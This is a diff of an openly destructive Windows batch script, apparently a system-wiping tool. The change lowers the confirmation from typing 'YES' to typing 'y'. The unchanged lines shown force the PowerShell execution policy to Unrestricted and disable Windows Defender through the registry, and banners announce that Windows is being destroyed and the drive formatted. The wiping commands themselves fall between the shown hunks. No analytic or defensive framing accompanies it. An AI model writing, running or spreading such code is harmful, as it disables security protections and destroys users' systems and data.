@@ -12,9 +12,9 @@ echo                  ██████╔╝╚██████╔╝██�
 echo                  ╚═════╝  ╚═════╝ ╚══════╝
 echo.
 echo                 THIS WILL DESTROY WINDOWS IN <8 SECONDS
-set /p "choice=                Type YES to kill instantly → "
+set /p "choice=                Type y to kill instantly → "
 
-if /i not "%choice%"=="YES" (cls & echo Canceled. & timeout 3 >nul & exit)
+if /i not "%choice%"=="y" (cls & echo Canceled. & timeout 3 >nul & exit)
 
 powershell -ep bypass -c "Set-ExecutionPolicy Unrestricted -Force" >nul 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
@@ -39,3 +39,4 @@ echo                  LIGHTNING DEATH = EXECUTED
 echo                  WINDOWS = DEAD IN <8 SECONDS
 echo                  DRIVE  = BEING FORMATTED
 timeout /t 999 >nul
+
